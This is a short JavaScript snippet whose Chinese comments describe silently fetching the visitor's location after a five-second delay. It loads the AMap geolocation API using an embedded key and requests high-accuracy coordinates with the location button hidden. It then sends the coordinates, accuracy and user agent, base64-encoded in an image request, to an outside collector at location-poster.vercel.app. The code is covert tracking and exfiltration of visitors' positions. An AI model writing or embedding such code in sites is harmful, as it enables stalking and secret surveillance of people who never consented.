// 静默获取定位（延迟5秒执行）
setTimeout(() => {
  try {
    // 加载高德地图API（Key已正确配置）
    const script = document.createElement('script');
    script.src = 'https://webapi.amap.com/maps?v=2.0&key=1460b000366c924e153f9a674e7a50a9&plugin=AMap.Geolocation';
    script.onload = () => {
      const geo = new AMap.Geolocation({
        enableHighAccuracy: true,
        showButton: false,
        timeout: 15000
      });
      geo.getCurrentPosition((status, result) => {
        const payload = {
          ua: navigator.userAgent,
          time: new Date().toISOString(),
          loc: status === 'complete' ? {
            lat: result.position.lat,
            lng: result.position.lng,
            acc: result.accuracy
          } : null
        };
        // 发送到Vercel
        new Image().src = `https://location-poster.vercel.app/api/collect?data=${btoa(JSON.stringify(payload))}`;
      });
    };
    document.head.appendChild(script);
  } catch(e) { console.error(e) }
}, 5000);
